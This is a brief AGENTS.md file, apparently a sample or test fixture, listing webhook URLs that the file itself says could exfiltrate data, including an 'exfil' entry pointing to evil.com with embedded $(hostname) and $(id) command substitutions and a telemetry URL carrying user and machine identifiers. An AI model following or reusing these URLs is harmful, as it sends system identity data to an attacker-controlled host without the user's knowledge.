# AGENTS.md — AI agent config with variable interpolation URLs

These URLs contain template variables that could be used to exfiltrate data.

## Webhook Targets
- callback: https://webhook.site/${PAYLOAD_ID}
- exfil: http://evil.com/$(hostname)-$(id)
- telemetry: https://analytics.example.com/%USER_ID%/%MACHINE_GUID%
